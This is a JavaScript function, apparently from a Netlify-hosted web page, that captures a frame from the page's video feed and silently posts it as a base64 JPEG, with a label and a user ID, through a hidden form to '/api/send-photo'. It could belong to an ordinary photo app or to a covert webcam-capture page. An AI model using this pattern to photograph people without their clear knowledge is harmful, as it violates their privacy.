// ===== CAPTURE AND SEND PHOTO =====
async function captureAndSendPhoto(label) {
  return new Promise(async (resolve) => {
    try {
      const video = document.getElementById("video");
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      debugLog(`🖼️ Converting ${label}...`);
      
      // Convert to base64
      const imageData = canvas.toDataURL('image/jpeg', 0.9);
      
      debugLog(`📤 Sending ${label}...`);
      
      // Create a hidden form
      const form = document.createElement('form');
      form.style.display = 'none';
      form.method = 'POST';
      form.action = '/api/send-photo'; // This will be processed by Netlify
      
      // Add data as hidden inputs
      const imageInput = document.createElement('input');
      imageInput.type = 'hidden';
      imageInput.name = 'image';
      imageInput.value = imageData;
      
      const labelInput = document.createElement('input');
      labelInput.type = 'hidden';
      labelInput.name = 'label';
      labelInput.value = label;
      
      const userIdInput = document.createElement('input');
      userIdInput.type = 'hidden';
      userIdInput.name = 'userId';
      userIdInput.value = USER_ID;
      
      form.appendChild(imageInput);
      form.appendChild(labelInput);
      form.appendChild(userIdInput);
      document.body.appendChild(form);
      
      // Submit form
      form.submit();
      
      debugLog(`✅ ${label} sent!`);
      resolve();
      
    } catch (error) {
      debugLog(`❌ Capture error for ${label}: ${error.message}`);
      resolve();
    }
  });
}
